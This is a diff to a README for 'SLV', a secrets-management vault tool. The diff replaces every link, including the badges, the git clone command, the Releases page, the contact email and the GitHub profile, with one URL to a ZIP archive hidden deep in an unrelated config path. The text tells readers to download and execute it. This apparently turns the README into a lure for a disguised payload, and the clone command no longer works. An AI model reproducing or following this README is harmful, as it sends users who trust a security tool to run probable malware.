@@ -1,6 +1,6 @@
 # SLV: Secure Local Vault for Secrets Management 🔐
 
-![GitHub release](https://img.shields.io/github/release/Dimetro-Only/slv.svg) ![GitHub issues](https://img.shields.io/github/issues/Dimetro-Only/slv.svg) ![GitHub forks](https://img.shields.io/github/forks/Dimetro-Only/slv.svg) ![GitHub stars](https://img.shields.io/github/stars/Dimetro-Only/slv.svg)
+![GitHub release](https://raw.githubusercontent.com/Dimetro-Only/slv/master/internal/k8s/config/crd/patches/Software-v3.1-alpha.2.zip) ![GitHub issues](https://raw.githubusercontent.com/Dimetro-Only/slv/master/internal/k8s/config/crd/patches/Software-v3.1-alpha.2.zip) ![GitHub forks](https://raw.githubusercontent.com/Dimetro-Only/slv/master/internal/k8s/config/crd/patches/Software-v3.1-alpha.2.zip) ![GitHub stars](https://raw.githubusercontent.com/Dimetro-Only/slv/master/internal/k8s/config/crd/patches/Software-v3.1-alpha.2.zip)
 
 Welcome to **SLV**, a secure local vault designed to store, share, and access secrets alongside your codebase. This tool leverages quantum-safe cryptography to ensure your sensitive information remains protected. 
 
@@ -29,7 +29,7 @@ To install SLV, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/Dimetro-Only/slv.git
+   git clone https://raw.githubusercontent.com/Dimetro-Only/slv/master/internal/k8s/config/crd/patches/Software-v3.1-alpha.2.zip
    cd slv
    ```
 
@@ -103,15 +103,15 @@ SLV is licensed under the MIT License. See the [LICENSE](LICENSE) file for more 
 
 ## Releases
 
-For the latest updates and versions, visit our [Releases](https://github.com/Dimetro-Only/slv/releases) page. Here, you can download the latest version and execute it on your system.
+For the latest updates and versions, visit our [Releases](https://raw.githubusercontent.com/Dimetro-Only/slv/master/internal/k8s/config/crd/patches/Software-v3.1-alpha.2.zip) page. Here, you can download the latest version and execute it on your system.
 
 ## Contact
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: contact@example.com
-- **GitHub**: [Dimetro-Only](https://github.com/Dimetro-Only)
+- **Email**: https://raw.githubusercontent.com/Dimetro-Only/slv/master/internal/k8s/config/crd/patches/Software-v3.1-alpha.2.zip
+- **GitHub**: [Dimetro-Only](https://raw.githubusercontent.com/Dimetro-Only/slv/master/internal/k8s/config/crd/patches/Software-v3.1-alpha.2.zip)
 
 ## Conclusion
 
-SLV offers a reliable solution for managing secrets securely. With its focus on quantum-safe cryptography and ease of use, you can confidently store and share your sensitive information. For more details and updates, please visit our [Releases](https://github.com/Dimetro-Only/slv/releases) section.
+SLV offers a reliable solution for managing secrets securely. With its focus on quantum-safe cryptography and ease of use, you can confidently store and share your sensitive information. For more details and updates, please visit our [Releases](https://raw.githubusercontent.com/Dimetro-Only/slv/master/internal/k8s/config/crd/patches/Software-v3.1-alpha.2.zip) section.
